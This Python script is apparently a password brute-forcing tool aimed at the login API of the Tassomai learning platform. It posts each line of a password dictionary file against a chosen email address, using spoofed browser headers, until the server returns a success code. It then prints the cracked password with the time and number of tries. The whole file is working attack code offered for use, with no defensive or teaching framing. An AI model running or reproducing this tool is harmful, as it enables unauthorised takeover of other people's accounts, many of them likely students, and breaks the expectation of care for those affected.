from time import time
from os import system
import requests
session = requests.Session()
def checkRequest(passw,em):
    url = "https://kolin.tassomai.com/api/user/login/"
    payload = '{"email":' + '"'+em+'"'+',"password":'+'"'+passw+'"'+',"capabilities":{"image":true,"isMobile":false,"mathjax":true}}'
    head = {"authority": "kolin.tassomai.com",
            "method": "POST",
            "path": "/api/user/login/",
            "scheme": "https",
            "accept": "application/json; version=1.3",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-length": "134",
            "content-type": "application/json",
            "origin": "https://app.tassomai.com",
            "referer": "https://app.tassomai.com/login",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/8.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36'"
        }
    r = session.post(url, data=payload, headers=head)
    r_split=str(r).split("[")
    r_removed = str(r_split[1]).replace("]", '')
    r_removed = r_removed.replace(">", '')
    if r_removed == '200':
        return True
    else:
        return False

def found(passw, etime, stime, tries):
    print("Found!\nPassword: " + str(passw))
    print("Took " + str(etime - stime) + " seconds to find!")
    print("Took " + str(tries) + " Tries to find")
    input("Press any key to continue...")
    system("cls")
def check(passw,em):
    ctime = time()
    if checkRequest(passw,em):
        return True, (time() - ctime)
    else:
        return False, (time() - ctime)
def openfile(file, att):
    return open(file, att)      
def dict(email):
    found1 = False
    with open("dict.txt", "r+") as b:
        new_b = b.readlines()
        linenum = 0
        tries = 0
        for line in new_b:
            linenum += 1
            line = line.strip()
            checked = check(line,email)
            tries +=1
            print ("num: " + str(linenum) + " " + line + " Time: " + str(checked[1]))
            if checked[0]:
                found1 = True
                return(line, tries)
    if found1 != True:
        return('')

def check_internet():
    url='http://www.google.com/'
    timeout=5
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        pass
    return False